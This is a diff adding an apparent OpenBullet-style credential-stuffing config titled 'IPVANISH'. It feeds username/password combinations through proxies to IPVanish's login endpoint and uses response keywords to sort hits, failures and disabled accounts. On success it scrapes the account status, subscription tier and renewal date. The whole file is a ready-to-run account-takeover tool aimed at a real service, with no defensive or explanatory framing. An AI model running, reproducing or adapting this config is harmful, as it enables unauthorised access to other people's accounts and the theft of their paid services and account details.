@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "IPVANISH",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-06T12:14:02.01421+00:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://account.ipvanish.com/login/validate" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Referer: https://account.ipvanish.com/login" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, your account credentials are invalid. " 
+  KEYCHAIN Success OR 
+    KEY "logout" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Your service has been temporarily disabled.  " 
+PARSE "<SOURCE>" LR "<span class=\"profile_label\"><b>Account Status:</b></span>" "</span>" -> VAR "STATUS2" 
+FUNCTION Replace "<span class=\"profile_label\">" " " "<STATUS2>" -> CAP "STATUS" 
+PARSE "<SOURCE>" LR "<span class=\"profile_label\"><b>Current Tier:</b></span>" "</span>" -> VAR "TIER2" 
+FUNCTION Replace "<span class=\"profile_label\">" " " "<TIER2>" -> CAP "TIER" 
+PARSE "<SOURCE>" LR "<span class=\"profile_label\"><b>Renewal Date:</b></span>" "</span>" -> VAR "RENEWAL2" 
+FUNCTION Replace "<span class=\"profile_label\">" " " "<RENEWAL2>" -> CAP "RENEWAL" 
